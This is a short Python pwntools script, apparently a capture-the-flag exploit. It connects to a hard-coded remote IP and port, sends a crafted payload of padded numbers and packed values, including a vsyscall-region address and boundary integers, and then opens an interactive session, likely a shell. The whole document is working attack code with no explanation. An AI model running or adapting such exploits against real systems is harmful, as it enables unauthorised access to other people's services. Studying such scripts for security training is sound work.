import numpy as np
import sys
import time
from pwn import *

context.arch='amd64'

#host,port = '127.0.0.1','1160'
host,port = '35.201.132.60','13337'
delay = 1

padding = [
        '2'.ljust(31,'\0'),
        '384307168202282326'.ljust(31,'\0'),
        '3'.ljust(31,'\0'),
        '5'.ljust(31,'\0'),
        (0xffffffffff6008f0).to_bytes(8,'little'),
        (0x7fffffff).to_bytes(4,'little'),
        (7122222).to_bytes(4,'little')+b'\0',
        '87'.ljust(31,'\0'),
        '2'.ljust(31,'\0'),
        '0'.ljust(31,'\0'),
        '3'.ljust(31,'\0'),
        '1'.ljust(31,'\0'),
        ]

r = remote(host,port)

msg = flat(padding); print(msg); r.send(msg)

time.sleep(delay)
msg = r.recv(); print(msg.decode(),end='')

r.interactive()

r.close()
